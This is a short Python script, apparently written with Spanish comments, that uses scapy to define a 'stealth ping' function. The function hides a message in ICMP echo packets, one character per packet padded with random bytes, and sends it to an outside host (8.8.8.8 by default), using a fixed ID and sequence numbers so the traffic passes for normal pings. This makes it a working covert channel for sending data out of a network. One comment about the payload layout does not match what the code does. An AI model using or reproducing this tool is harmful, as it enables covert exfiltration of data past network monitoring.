from scapy.all import IP, ICMP, send
import os

def send_stealth_ping(message, dst="8.8.8.8"):
    icmp_id = 1234      # ID coherente para todos los paquetes
    seq = 0             # Secuencia coherente
    for ch in message:
        # Payload de 48 bytes: 8 bytes iniciales intactos + datos desde 0x10
        payload = bytes(ch, 'utf-8') + os.urandom(48 - 1)
        pkt = IP(dst=dst) / ICMP(type=8, id=icmp_id, seq=seq) / payload
        send(pkt, verbose=0)
        seq += 1


